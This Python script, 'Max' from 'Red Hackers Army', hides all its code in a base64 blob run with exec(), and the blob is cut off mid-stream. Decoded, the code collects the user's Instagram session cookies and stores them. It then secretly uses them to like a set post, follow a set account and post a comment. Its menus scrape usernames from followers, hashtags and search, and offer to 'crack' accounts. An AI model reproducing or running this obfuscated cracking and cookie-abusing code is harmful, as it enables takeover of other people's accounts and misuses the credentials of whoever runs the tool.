# Tool Name : Max
# Created By Aryan
# Instagram : Red Hackers Army

import base64
exec(base64.b64decode('aW1wb3J0IG9zLCByZSwgc3lzLCB0aW1lLCBqc29uLCByYW5kb20sIHJlcXVlc3RzCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IKZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3IKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAoKIyBXYXJuYQpIID0gKCdceDFiWzE7OTBtJykKTSA9ICgnXHgxYlsxOzkxbScpCkggPSAoJ1x4MWJbMTs5Mm0nKQpLID0gKCdceDFiWzE7OTNtJykKVCA9ICgnXHgxYlsxOzk0bScpClUgPSAoJ1x4MWJbMTs5NW0nKQpCID0gKCdceDFiWzE7OTZtJykKUCA9ICgnXHgxYlsxOzk3bScpCgojIExvZ28KX19fbG9nb19fXyA9IChmIiIie0h9IF9fXyBfX18gX19fIF9fICBfXyBfX18gXyAgIF8gX18gIF9fCntIfXwgXyBcIF8gXCBfX3wgIFwvICB8XyBffCB8IHwgfCAgXC8gIHwKe0J9fCAgXy8gICAvIF98fCB8XC98IHx8IHx8IHxffCB8IHxcL3wgfAp7Qn18X3wgfF98X1xfX198X3wgIHxffF9fX3xcX19fL3xffCAgfF98CntLfVt7UH3igKJ7S31de1B94oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCUCntIfVt7UH0+e0h9XXtQfSBBdSA6IEFyeWFuCntIfVt7UH0+e0h9XXtQfSBJZyA6IEByZWQgaGFja2VycyBhcm15CntIfVt7UH0+e0h9XXtQfSBXdCA6ICs5MTczNTYyNjg4MTgKe0t9W3tQfeKAontLfV17UH3igJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJQKIiIiKQojIExvZ2luIENvb2tpZQpkZWYgX19fbG9naW5fX18oKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQoX19fbG9nb19fXykKICAgIHByaW50KGYie0J9W3tQfeKAontCfV17UH0gRW50ZXIgSW5zdGFncmFtIENvb2tpZXMsTXkgV2hhdHNhcHAgTnVtYmVyIElzICs5MTczNTYyNjg4MTggLFlvdSBTaG91bGQgTm90IFVzZSBOZXdseSBDcmVhdGVkIEFjY291bnRzIElmIFlvdSBEb24ndCBLbm93IEhvdyBUbyBHZXQgSW5zdGFncmFtIENvb2tpZXMgVHlwZSB7TX1be1B9S2FybWF7TX1de1B9XG4iKQogICAgX19fY29va2llID0gaW5wdXQoZiJ7SH1be1B9P3tIfV17UH0gQ29va2llIDp7S30gIikKICAgIGlmIF9fX2Nvb2tpZSBpbiBbJ2thcm1hJywgJ0thcm1hJywgJ0tBUk1BJ106CiAgICAgICAgcHJpbnQoZiJ7S31be1B9IXtLfV17UH0gIFlvdSBXaWxsIEJlIFJlZGlyZWN0ZWQgVG8gV2hhdHNhcHAuLi4iKTtzbGVlcCgzKTtvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd2EubWUvKzkxNzM1NjI2ODgxOCcpO2V4aXQoKQogICAgZWxpZiBfX19jb29raWUgaW4gWycnLCAnICddOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRG9uJ3QgRW1wdHkiKQogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIF9fX3VzZXJpZCA9IHJlLnNlYXJjaCgnZHNfdXNlcl9pZD0oLio/KTsnLCBfX19jb29raWUpO29wZW4oJ0RhdGEvdXNlci50eHQnLCAndycpLndyaXRlKF9fX3VzZXJpZC5ncm91cCgxKSkKICAgICAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL3VzZXJzL3tfX191c2VyaWQuZ3JvdXAoMSl9L2luZm8vJywgaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzNGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ni4wLjQyNDAuMTk4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAxNjYuMS4wLjQyLjI0NSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIwNDI7IHNhbXN1bmc7IFNNLUc5NzNGOyBiZXlvbmQxOyBleHlub3M5ODIwOyBlbl9HQjsgMjU2MDk5MjA0KScsICdjb29raWUnOiBfX19jb29raWV9KS5qc29uKClbJ3VzZXInXTtvcGVuKCdEYXRhL2Nva2kudHh0JywgJ3cnKS53cml0ZShfX19jb29raWUpCiAgICAgICAgICAgIHByaW50KGYie0h9W3tQfSp7SH1de1B9IFdlbGNvbWUgOntLfSB7X19fcm96WydmdWxsX25hbWUnXX0iKTtfX19mb2xsb3dfX18oKQogICAgICAgIGV4Y2VwdCAoQXR0cmlidXRlRXJyb3IsIEtleUVycm9yKToKICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBNYWtlIFN1cmUgQ29va2llcyBBcmUgQ29ycmVjdCIpCiAgICAgICAgZXhjZXB0IChDb25uZWN0aW9uRXJyb3IpOgogICAgICAgICAgICBleGl0KGYie1B9W3tLfSF7UH1de0t9IENvbm5lY3Rpb24gRXJyb3IiKQojIEZvbGxvdyBDb29raWUKZGVmIF9fX2ZvbGxvd19fXygpOgogICAgdHJ5OgogICAgICAgIF9fX2Nvb2tpZSA9IG9wZW4oJ0RhdGEvY29raS50eHQnLCAncicpLnJlYWQoKQogICAgICAgIF9fX3Nlc3Npb24gPSByZS5zZWFyY2goJ3Nlc3Npb25pZD0oLio/KTsnLCBfX19jb29raWUpCiAgICAgICAgX19fdGVrcyA9IHJhbmRvbS5jaG9pY2UoWydQcm9ncmFtbWVyJydHcmVldGluZ3MgdG8ga25vdyddKQogICAgICAgIF9fX2RhdGEgPSB7J2NvbW1lbnRfdGV4dCc6IF9fX3Rla3MsJ3JlcGxpZWRfdG9fY29tbWVudF9pZCc6Jyd9CiAgICAgICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgc2VzOgogICAgICAgICAgICBfX19saWtlID0gc2VzLnBvc3QoJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vd2ViL2xpa2VzLzI3MzQzMTcyMDUxMTUzODI2MjkvbGlrZS8nLGhlYWRlcnMgPSB7J2FjY2VwdCc6ICcqLyonLCdhY2NlcHQtZW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLCdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLCdjb250ZW50LWxlbmd0aCc6ICcwJywnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsJ2Nvb2tpZSc6ICdpZ19kaWQ9RjgzOUQ5MDAtNUVDQy00MzkyLUJDQUQtNUNCRDUxRkI5MjI4OyBtaWQ9WUNobHlRQUxBQUhwMlBPT3AybEtfLWNpQUdsTTsgaWdfbnJjYj0xOyBjc3JmdG9rZW49VzRmc1ptQ2pVakZtczZYbUtsMU9Bamc4djgxalp0M3I7IGRzX3VzZXJfaWQ9NDU4NzIwMzQ5OTc7IHNlc3Npb25pZD0nK19fX3Nlc3Npb24uZ3JvdXAoMSksJ29yaWdpbic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tJywncmVmZXJlcic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLycsJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5Jywnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODguMC40MzI0LjE4MiBTYWZhcmkvNTM3LjM2JywneC1jc3JmdG9rZW4nOiAnVzRmc1ptQ2pVakZtczZYbUtsMU9Bamc4djgxalp0M3InLCd4LWlnLWFwcC1pZCc6ICc1Mzk4MjE4MDgzJywneC1pZy13d3ctY2xhaW0nOiAnaG1hYy5BUjBPUVk0R3c0a2N6V052ZlZPaHZvbGpTSU5xQjJ1MmdCLXV0VVExTUYwTWtyenUnLCd4LWluc3RhZ3JhbS1hamF4JzogJzk1YmZlZjVkZDgxNicsJ3gtcmVxdWVzdGVkLXdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnfSkudGV4dCAjIEphbmdhbiBEaSBVYmFoIQogICAgICAgICAgICBfX19mb2xsb3cgPSBzZXMucG9zdCgnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS93ZWIvZnJpZW5kc2hpcHMvNTM5ODIxODA4My9mb2xsb3cvJyxoZWFkZXJzID0geydhY2NlcHQnOiAnKi8qJywnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUsIGJyJywnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywnY29udGVudC1sZW5ndGgnOiAnMCcsJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLCdjb29raWUnOiAnaWdfZGlkPUY4MzlEOTAwLTVFQ0MtNDM5Mi1CQ0FELTVDQkQ1MUZCOTIyODsgbWlkPVlDaGx5UUFMQUFIcDJQT09wMmxLXy1jaUFHbE07IGlnX25yY2I9MTsgY3NyZnRva2VuPVc0ZnNabUNqVWpGbXM2WG1LbDFPQWpnOHY4MWpadDNyOyBkc191c2VyX2lkPTQ1ODcyMDM0OTk3OyBzZXNzaW9uaWQ9JytfX19zZXNzaW9uLmdyb3VwKDEpLCdvcmlnaW4nOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbScsJ3JlZmVyZXInOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nLCdzZWMtZmV0Y2gtZGVzdCc6ICdlbXB0eScsJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLCdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg4LjAuNDMyNC4xODIgU2FmYXJpLzUzNy4zNicsJ3gtY3NyZnRva2VuJzogJ1c0ZnNabUNqVWpGbXM2WG1LbDFPQWpnOHY4MWpadDNyJywneC1pZy1hcHAtaWQnOiAnNTM5ODIxODA4MycsJ3gtaWctd3d3LWNsYWltJzogJ2htYWMuQVIwT1FZNEd3NGtjeldOdmZWT2h2b2xqU0lOcUIydTJnQi11dFVRMU1GME1rcnp1JywneC1pbnN0YWdyYW0tYWpheCc6ICc5NWJmZWY1ZGQ4MTYnLCd4LXJlcXVlc3RlZC13aXRoJzogJ1hNTEh0dHBSZXF1ZXN0J30pLnRleHQgIyBKYW5nYW4gRGkgVWJhaCEKICAgICAgICAgICAgX19fa29tZW4gPSBzZXMucG9zdCgnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS93ZWIvY29tbWVudHMvMjczNDMxNzIwNTExNTM4MjYyOS9hZGQvJyxoZWFkZXJzID0geydhY2NlcHQnOiAnKi8qJywnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUsIGJyJywnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywnY29udGVudC1sZW5ndGgnOiAnMCcsJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLCdjb29raWUnOiAnaWdfZGlkPUY4MzlEOTAwLTVFQ0MtNDM5Mi1CQ0FELTVDQkQ1MUZCOTIyODsgbWlkPVlDaGx5UUFMQUFIcDJQT09wMmxLXy1jaUFHbE07IGlnX25yY2I9MTsgY3NyZnRva2VuPVc0ZnNabUNqVWpGbXM2WG1LbDFPQWpnOHY4MWpadDNyOyBkc191c2VyX2lkPTQ1ODcyMDM0OTk3OyBzZXNzaW9uaWQ9JytfX19zZXNzaW9uLmdyb3VwKDEpLCdvcmlnaW4nOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbScsJ3JlZmVyZXInOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nLCdzZWMtZmV0Y2gtZGVzdCc6ICdlbXB0eScsJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLCdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg4LjAuNDMyNC4xODIgU2FmYXJpLzUzNy4zNicsJ3gtY3NyZnRva2VuJzogJ1c0ZnNabUNqVWpGbXM2WG1LbDFPQWpnOHY4MWpadDNyJywneC1pZy1hcHAtaWQnOiAnNTM5ODIxODA4MycsJ3gtaWctd3d3LWNsYWltJzogJ2htYWMuQVIwT1FZNEd3NGtjeldOdmZWT2h2b2xqU0lOcUIydTJnQi11dFVRMU1GME1rcnp1JywneC1pbnN0YWdyYW0tYWpheCc6ICc5NWJmZWY1ZGQ4MTYnLCd4LXJlcXVlc3RlZC13aXRoJzogJ1hNTEh0dHBSZXF1ZXN0J30sIGRhdGEgPSBfX19kYXRhKS50ZXh0ICNKYW5nYW4gRGkgdWJhaCEKICAgICAgICAgICAgaWYgJyJzdGF0dXMiOiJvayInIGluIHN0cihfX19mb2xsb3cpOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7SH1be1B9IXtIfV17UH0gTG9naW4gU3VjY2Vzc2Z1bCIpO19fX21lbnVfX18oKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7UH1be019IXtQfV17TX0gQ29va2llIEludmFsaWQiKTtzbGVlcCgzKTtvcy5zeXN0ZW0oJ3JtIC1yZiBEYXRhL2Nva2kudHh0Jyk7X19fbG9naW5fX18oKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYie1B9W3tNfSF7UH1de019IENvb2tpZSBJbnZhbGlkIik7c2xlZXAoMyk7b3Muc3lzdGVtKCdybSAtcmYgRGF0YS9jb2tpLnR4dCcpO19fX2xvZ2luX19fKCkKIyBNZW51CmRlZiBfX19tZW51X19fKCk6CiAgICB0cnk6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQoX19fbG9nb19fXykKICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvdXNlcnMve29wZW4oIkRhdGEvdXNlci50eHQiLCJyIikucmVhZCgpfS9pbmZvLycsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKClbJ3VzZXInXQogICAgICAgIHByaW50KGYie0J9W3tQfSp7Qn1de1B9IFdlbGNvbWUgOntLfSB7X19fcm96WydmdWxsX25hbWUnXX0iKQogICAgICAgIHByaW50KGYie0J9W3tQfSp7Qn1de1B9IFVzZXIgOntLfSB7X19fcm96Wyd1c2VybmFtZSddfSIpCiAgICAgICAgcHJpbnQoZiJ7Qn1be1B9KntCfV17UH0gRm9sbG93ZXIgOntLfSB7X19fcm96Wydmb2xsb3dlcl9jb3VudCddfVxuIikKICAgIGV4Y2VwdCAoSU9FcnJvcik6CiAgICAgICAgcHJpbnQoZiJ7UH1be019IXtQfV17TX0gQ29va2llIEludmFsaWQiKTtzbGVlcCgzKTtfX19sb2dpbl9fXygpCiAgICBleGNlcHQgKEtleUVycm9yKToKICAgICAgICBwcmludChmIntQfVt7TX0he1B9XXtNfSBDb29raWUgSW52YWxpZCIpO29zLnN5c3RlbSgncm0gLXJmIERhdGEvY29raS50eHQgJiYgcm0gLXJmIERhdGEvdXNlci50eHQnKTtzbGVlcCgzKTtfX19sb2dpbl9fXygpCiAgICBleGNlcHQgKElPRXJyb3IpOgogICAgICAgICAgICAgZXhpdChmIntQfVt7S30he1B9XXtLfSBDb25uZWN0aW9uRXJyb3IiKQogICAgcHJpbnQoZiJ7Qn1be1B9MXtCfV17UH0gRHVtcCBVc2VybmFtZSBGcm9tIEZvbGxvd2luZyIpCiAgICBwcmludChmIntCfVt7UH0ye0J9XXtQfSBEdW1wIFVzZXJuYW1lIEZyb20gRm9sbG93ZXIiKQogICAgcHJpbnQoZiJ7Qn1be1B9M3tCfV17UH0gRHVtcCBVc2VybmFtZSBGcm9tIEFjdGl2aXR5IikKICAgIHByaW50KGYie0J9W3tQfTR7Qn1de1B9IER1bXAgVXNlcm5hbWUgRnJvbSBIb21lIikKICAgIHByaW50KGYie0J9W3tQfTV7Qn1de1B9IER1bXAgVXNlcm5hbWUgRnJvbSBIYXN0YWciKQogICAgcHJpbnQoZiJ7Qn1be1B9NntCfV17UH0gRHVtcCBVc2VybmFtZSBGcm9tIFNlYXJjaCIpCiAgICBwcmludChmIntCfVt7UH03e0J9XXtQfSBEdW1wIFVzZXJuYW1lIEZyb20gUXVlcnkiKQogICAgcHJpbnQoZiJ7Qn1be1B9OHtCfV17UH0gRHVtcCBVc2VyIEZyb20gIEVtYWlsIikKICAgIHByaW50KGYie0J9W3tQfTl7Qn1de1B9IFN0YXJ0IENyYWNrIHtQfVt7SH1GYXN0e1B9XXtIfSIpCiAgICBwcmludChmIntCfVt7UH0we0J9XXtQfSBWaWV3IENyYWNrIFJlc3VsdHMiKQogICAgcHJpbnQoZiJ7Qn1be1B9QXtCfV17UH0gRXhpdCB7UH1be019RXhpdHtQfV17TX1cbiIpCiAgICBfX19waWxpaCA9IGlucHV0KGYie0h9W3tQfT97SH1de1B9IFNlbGVjdCA6e0t9ICIpCiAgICBpZiBfX19waWxpaCBpbiBbJzEnLCcwMSddOgogICAgICAgIF9fX21lbmdpa3V0aV9fXygpCiAgICBlbGlmIF9fX3BpbGloIGluIFsnMicsJzAyJ106CiAgICAgICAgX19fcGVuZ2lrdXRfX18oKQogICAgZWxpZiBfX19waWxpaCBpbiBbJzMnLCcwMyddOgogICAgICAgIF9fX2FjdGl2aXR5X19fKCkKICAgIGVsaWYgX19fcGlsaWggaW4gWyc0JywnMDQnXToKICAgICAgICBfX19iZXJhbmRhX19fKCkKICAgIGVsaWYgX19fcGlsaWggaW4gWyc1JywnMDUnXToKICAgICAgICBfX19oYXN0YWdfX18oKQogICAgZWxpZiBfX19waWxpaCBpbiBbJzYnLCcwNiddOgogICAgICAgIF9fX3NlYXJjaF9fXygpCiAgICBlbGlmIF9fX3BpbGloIGluIFsnNycsJzA3J106CiAgICAgICAgX19fcXVlcnlfX18oKQogICAgZWxpZiBfX19waWxpaCBpbiBbJzgnLCcwOCddOgogICAgICAgIF9fX2VtYWlsX19fKCkKICAgIGVsaWYgX19fcGlsaWggaW4gWyc5JywnMDknXToKICAgICAgICBfX19wcm94eV9fXygpCiAgICBlbGlmIF9fX3BpbGloIGluIFsnMCcsJzAwJ106CiAgICAgICAgdHJ5OgogICAgICAgICAgICBwcmludChmIlxue0h9W3tQfTF7SH1de1B9IFNlZSBSZXN1bHQgT2siKQogICAgICAgICAgICBwcmludChmIntIfVt7UH0ye0h9XXtQfSBWaWV3IFJlc3VsdCBDcCIpCiAgICAgICAgICAgIHByaW50KGYie0h9W3tQfTN7SH1de1B9IFJldHVyblxuIikKICAgICAgICAgICAgX19faGFzaWwgPSBpbnB1dChmIntCfVt7UH0/e0J9XXtQfSBTZWxlY3QgOntLfSAiKQogICAgICAgICAgICBpZiBfX19oYXNpbCBpbiBbJzEnLCcwMSddOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7UH0gIik7b3Muc3lzdGVtKCdjYXQgUmVzdWx0cy9Pay50eHQnKQogICAgICAgICAgICBlbGlmIF9fX2hhc2lsIGluIFsnMicsJzAyJ106CiAgICAgICAgICAgICAgICBwcmludChmIntQfSAiKTtvcy5zeXN0ZW0oJ2NhdCBSZXN1bHRzL0NwLnR4dCcpCiAgICAgICAgICAgIGVsaWYgX19faGFzaWwgaW4gWyczJywnMDMnXToKICAgICAgICAgICAgICAgIF9fX21lbnVfX18oKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBXcm9uZyBJbnB1dCIpCiAgICAgICAgZXhjZXB0OnBhc3MKICAgIGVsaWYgX19fcGlsaWggaW4gWydhJywnQSddOgogICAgICAgIHByaW50KGYie1B9W3tLfSF7UH1de0t9IERlbGV0aW5nIENvb2tpZS4uLiIpO29zLnN5c3RlbSgncm0gLXJmIERhdGEvY29raS50eHQgJiYgcm0gLXJmIERhdGEvdXNlci50eHQnKTtleGl0KCkKICAgIGVsc2U6CiAgICAgICAgZXhpdChmIntQfVt7S30he1B9XXtNfSBXcm9uZyBJbnB1dCIpCiMgRHVtcCBNZW5naWt1dGkKZGVmIF9fX21lbmdpa3V0aV9fXygpOgogICAgdHJ5OgogICAgICAgIF9fX3VzZXIgPSBpbnB1dChmIlxue0h9W3tQfT97SH1de1B9IFVzZXIgOntLfSAiKQogICAgICAgIGlmIF9fX3VzZXJbOjFdIGluIFsnMScsJzInLCczJywnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMCddOgogICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IFVzZSBVc2VybmFtZSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgX19fcm96ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS97X19fdXNlcn0vP19fYT0xJywgaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzNGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ni4wLjQyNDAuMTk4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAxNjYuMS4wLjQyLjI0NSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIwNDI7IHNhbXN1bmc7IFNNLUc5NzNGOyBiZXlvbmQxOyBleHlub3M5ODIwOyBlbl9HQjsgMjU2MDk5MjA0KScsICdjb29raWUnOiBvcGVuKCdEYXRhL2Nva2kudHh0JywncicpLnJlYWQoKX0pLmpzb24oKVsnZ3JhcGhxbCddWyd1c2VyJ10KICAgICAgICAgICAgcHJpbnQoZiJ7SH1be1B9P3tIfV17UH0gTmFtZSA6e0t9IHtfX19yb3pbJ2Z1bGxfbmFtZSddfVxuIikKICAgICAgICAgICAgX19fZmlsZSA9IChfX19yb3pbJ2Z1bGxfbmFtZSddLnJlcGxhY2UoJyAnLCdfJykrJy50eHQnKQogICAgICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHNlczoKICAgICAgICAgICAgX19femFrID0gc2VzLmdldChmJ2h0dHBzOi8vaS5pbnN0YWdyYW0uY29tL2FwaS92MS9mcmllbmRzaGlwcy97X19fcm96WyJpZCJdfS9mb2xsb3dpbmcvP2NvdW50PTUwMDAnLCBoZWFkZXJzID0geyd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tRzk3M0YgQnVpbGQvUVAxQS4xOTA3MTEuMDIwOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xOTggTW9iaWxlIFNhZmFyaS81MzcuMzYgSW5zdGFncmFtIDE2Ni4xLjAuNDIuMjQ1IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjA0Mjsgc2Ftc3VuZzsgU00tRzk3M0Y7IGJleW9uZDE7IGV4eW5vczk4MjA7IGVuX0dCOyAyNTYwOTkyMDQpJywgJ2Nvb2tpZSc6IG9wZW4oJ0RhdGEvY29raS50eHQnLCdyJykucmVhZCgpfSkuanNvbigpCiAgICAgICAgICAgIGZvciB6IGluIF9fX3pha1sndXNlcnMnXToKICAgICAgICAgICAgICAgIG9wZW4oJ0R1bXAvJytfX19maWxlLCAnYScpLndyaXRlKHpbJ3VzZXJuYW1lJ10rJzw9PicrelsnZnVsbF9uYW1lJ10rJ1xuJykKICAgICAgICAgICAgICAgIHByaW50KGYie1B9e3pbJ3VzZXJuYW1lJ119PD0+e3pbJ2Z1bGxfbmFtZSddfSIpCiAgICAgICAgICAgIHByaW50KGYiXG57Qn1be1B9KntCfV17UH0gRG9uZS4uLiIpCiAgICAgICAgICAgIHByaW50KGYie0J9W3tQfT97Qn1de1B9IEZpbGUgU2F2ZWQgQXQgOntLfSBEdW1wL3tfX19maWxlfSIpCiAgICAgICAgICAgIGlucHV0KGYie019W3tQfUJhY2t7TX1de1B9Iik7X19fbWVudV9fXygpCiAgICBleGNlcHQgKEtleUVycm9yKToKICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IER1bXAgRmFpbGVkIikKICAgIGV4Y2VwdCAoQ29ubmVjdGlvbkVycm9yKToKICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IENvbm5lY3Rpb24gRXJyb3IiKQojIER1bXAgUGVuZ2lrdXQKZGVmIF9fX3Blbmdpa3V0X19fKCk6CiAgICB0cnk6CiAgICAgICAgX19fdXNlciA9IGlucHV0KGYiXG57SH1be1B9P3tIfV17UH0gVXNlciA6e0t9ICIpCiAgICAgICAgaWYgX19fdXNlcls6MV0gaW4gWycxJywnMicsJzMnLCc0JywnNScsJzYnLCc3JywnOCcsJzknLCcwJ106CiAgICAgICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gVXNlIFVzZXJuYW1lIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoZidodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3tfX191c2VyfS8/X19hPTEnLCBoZWFkZXJzID0geyd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tRzk3M0YgQnVpbGQvUVAxQS4xOTA3MTEuMDIwOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xOTggTW9iaWxlIFNhZmFyaS81MzcuMzYgSW5zdGFncmFtIDE2Ni4xLjAuNDIuMjQ1IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjA0Mjsgc2Ftc3VuZzsgU00tRzk3M0Y7IGJleW9uZDE7IGV4eW5vczk4MjA7IGVuX0dCOyAyNTYwOTkyMDQpJywgJ2Nvb2tpZSc6IG9wZW4oJ0RhdGEvY29raS50eHQnLCdyJykucmVhZCgpfSkuanNvbigpWydncmFwaHFsJ11bJ3VzZXInXQogICAgICAgICAgICBwcmludChmIntIfVt7UH0/e0h9XXtQfSBOYW1lIDp7S30ge19fX3JvelsnZnVsbF9uYW1lJ119XG4iKQogICAgICAgICAgICBfX19maWxlID0gKF9fX3JvelsnZnVsbF9uYW1lJ10ucmVwbGFjZSgnICcsJ18nKSsnLnR4dCcpCiAgICAgICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgc2VzOgogICAgICAgICAgICBfX196YWsgPSBzZXMuZ2V0KGYnaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2ZyaWVuZHNoaXBzL3tfX19yb3pbImlkIl19L2ZvbGxvd2Vycy8/Y291bnQ9NTAwMCcsIGhlYWRlcnMgPSB7J3VzZXIt